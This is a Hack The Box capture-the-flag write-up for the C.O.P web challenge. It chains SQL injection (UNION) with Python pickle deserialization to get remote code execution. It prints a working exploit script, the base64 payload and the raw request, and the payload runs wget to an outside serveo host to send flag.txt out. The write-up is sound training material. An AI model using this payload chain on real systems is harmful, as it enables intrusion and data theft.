# [C.O.P](https://app.hackthebox.com/challenges/C.O.P) Writeup [HTB]
_Web_

## Investigating the website
This time, I have to deal with a ~~literal~~ cult! The Cult Of Pickles' website is very simple: there are 4 clickable items; clicking on item _id_ triggers a GET /view/_id_. Since the source code is available, I immediately check it!

The first thing I notice is that the flag is stored in some `flag.txt` file. The file isn't referenced anywhere in the code, which makes me think the goal is command injection.

The second thing I notice is a database. When calling GET /view/_id_, the following code is executed:
```py
def select_by_id(product_id):
        return query_db(f"SELECT data FROM products WHERE id='{product_id}'", one=True)
```
Since there is no input sanitizing whatsoever, the application is vulnerable to SQL injection. Good to know!

Now, back to the database. Items in the shop are saved in the database as following:
```py
# edited for simplicity
item1 = Item('Pickle Shirt', 'Get our new pickle shirt!', '23', '/static/images/pickle_shirt.jpg')
data1 = base64.b64encode(pickle.dumps(item1)).decode()
# then `data1` is added to the database, with incremental id
```
In other words, items in the database are Python objects that get dumped as `pickle` and encoded to base 64.

## Crafting a pickle
I'm not very familiar with `pickle`s, so I open the Python documentation and, surprise! I get exactly what I was looking for, right on top of the page, in a big red rectangle:

>*__Warning__* <br>
The `pickle` module **is not secure**. Only unpickle data you trust. <br>
It is possible to construct malicious pickle data which will **execute arbitrary code during unpickling**. Never unpickle data that could have come from an untrusted source, or that could have been tampered with.

I rub my hands like a cartoonish supervillain, and look for a PoC on Google. [This interesting article](https://davidhamann.de/2020/04/05/exploiting-python-pickle/) on `pickle` exploitation comes with a pretty handy script for RCE. 

My evil plan is the following:
1. Run the default HTTP python server on localhost;
2. Expose the server using [serveo](https://serveo.net/);
3. Force the C.O.P server to `GET <my_server_address>/<the flag>`

I copy the script and modify it according to my plan:
```py
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = ('wget https://a212adce5fa81618198dc354690108bb.serveo.net/$(cat flag.txt)')
        return os.system, (cmd,)

if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.b64encode(pickled))

# output : gASVYwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjEh3Z2V0IGh0dHBzOi8vYTIxMmFkY2U1ZmE4MTYxODE5OGRjMzU0NjkwMTA4YmIuc2VydmVvLm5ldC8kKGNhdCBmbGFnLnR4dCmUhZRSlC4=
```
Now I just need to trick the server into ~~eating~~ _unpickling_ my pickle!

## Injecting the pickle
Pickles are decoded and loaded inside the `render_template` function:
```py
@web.route('/view/<product_id>')
def product_details(product_id):
    return render_template('item.html', product=shop.select_by_id(product_id))
```
This means my ultimate aim is to force:
```py
product=b'gASVYwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjEh3Z2V0IGh0dHBzOi8vYTIxMmFkY2U1ZmE4MTYxODE5OGRjMzU0NjkwMTA4YmIuc2VydmVvLm5ldC8kKGNhdCBmbGFnLnR4dCmUhZRSlC4='
```

Remember that SQL injection? This is where it becomes _very_ convenient!

Let's look at the original query:
```sql
SELECT data
FROM products
WHERE id = '<the provided id>'
```
This query must be modified in two ways:
- First, I need to inject the malicious pickle in the result. This can be done with a "UNION" statement;
- Then, I have to make sure the malicious pickle is the first line in the result, otherwise it will be discarded. This can be done by passing a non-existent id.

Overall, the query will look like this:
```sql
SELECT data
FROM products
WHERE id = '5'
UNION
SELECT 'gASVYwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjEh3Z2V0IGh0dHBzOi8vYTIxMmFkY2U1ZmE4MTYxODE5OGRjMzU0NjkwMTA4YmIuc2VydmVvLm5ldC8kKGNhdCBmbGFnLnR4dCmUhZRSlC4='
```

Now that I have all it takes, I simply have to send the HTTP request.
```
GET /view/5'%20union%20select%20'gASVYwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjEh3Z2V0IGh0dHBzOi8vYTIxMmFkY2U1ZmE4MTYxODE5OGRjMzU0NjkwMTA4YmIuc2VydmVvLm5ldC8kKGNhdCBmbGFnLnR4dCmUhZRSlC4=
```
And my Python server will give me the flag on a silver plate!
```sh
127.0.0.1 - - [19/Aug/2024 09:49:50] "GET /HTB%7B<REDACTED>%7D HTTP/1.1" 404 -
```
